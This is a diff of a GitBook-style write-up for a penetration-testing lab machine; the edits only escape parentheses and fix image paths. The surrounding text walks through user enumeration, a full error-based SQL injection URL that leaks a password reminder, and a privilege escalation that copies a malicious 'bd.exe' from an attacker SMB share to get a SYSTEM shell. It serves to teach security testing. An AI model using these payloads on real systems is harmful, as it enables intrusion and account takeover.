@@ -44,7 +44,7 @@ Hence, we can confirm that `christopher` is a valid user.
 
 Tried:
 
-* SQL injection for password reminder (failed)
+* SQL injection for password reminder \(failed\)
 
 I then realised that the users page is on the `/users` path. By trying `http://192.168.237.127:33033/users/christopher`, we get an error traceback.
 
@@ -60,7 +60,7 @@ Now that we know that traceback is shown, we can try to go to an invalid path to
 
 Tried:
 
-* all 4 allowed request methods (failed - authentication)
+* all 4 allowed request methods \(failed - authentication\)
 
 There is another interesting path, `/slug`.
 
@@ -108,7 +108,7 @@ In this case, we can see that `evren.eagan` is the first username.
 
 Replacing the inner query with `SELECT reminder FROM USERS LIMIT 0,1`, we see the reminder, `4qpdR87QYjRbog`.
 
-{% embed url="http://192.168.237.127:33033/slug?URL=%27%20AND%201=%20(SELECT%201%20FROM(SELECT%20COUNT(*),concat(0x3a,(SELECT%20reminder%20FROM%20USERS%20LIMIT%200,1),FLOOR(rand(0)*2))x%20FROM%20information_schema.TABLES%20GROUP%20BY%20x)a)--%20-" %}
+{% embed url="http://192.168.237.127:33033/slug?URL=%27%20AND%201=%20\(SELECT%201%20FROM\(SELECT%20COUNT\(\*\),concat\(0x3a,\(SELECT%20reminder%20FROM%20USERS%20LIMIT%200,1\),FLOOR\(rand\(0\)\*2\)\)x%20FROM%20information\_schema.TABLES%20GROUP%20BY%20x\)a\)--%20-" %}
 
 ![](../../.gitbook/assets/b304646cfb9b4f7993b11fe6300ba5ca.png)
 
@@ -116,13 +116,13 @@ With this, we can go back to the password reset page and successfully reset the 
 
 ![](../../.gitbook/assets/a08384f350924cb7ad860668b8c032bd.png)
 
-![](<../../.gitbook/assets/0954fae671154dcdbb04fca50dc17303 (1).png>)
+![](../../.gitbook/assets/0954fae671154dcdbb04fca50dc17303%20%281%29.png)
 
 Now that we login to a valid user, we gain access to the edit feature.
 
 ![](../../.gitbook/assets/1613a5613f7a474cae8d7e72e87ecce0.png)
 
-### Web File Server (WFS)
+### Web File Server \(WFS\)
 
 There is another HTTPS service running at 44330. Here, we can upload arbitrary files.
 
@@ -226,6 +226,7 @@ Copy the new malicious `bd.exe`: `copy \\192.168.49.237\ROPNOP\bd.exe .`
 
 Now restart the system: `shutdown /r`. We should be able to catch a shell as SYSTEM:
 
-![](<../../.gitbook/assets/93fb81e275c546ce9fb9f6c6cd06e8d9 (1).png>)
+![](../../.gitbook/assets/93fb81e275c546ce9fb9f6c6cd06e8d9.png)
 
 ![](../../.gitbook/assets/51635976728b488aa4e72138b73b9669.png)
+
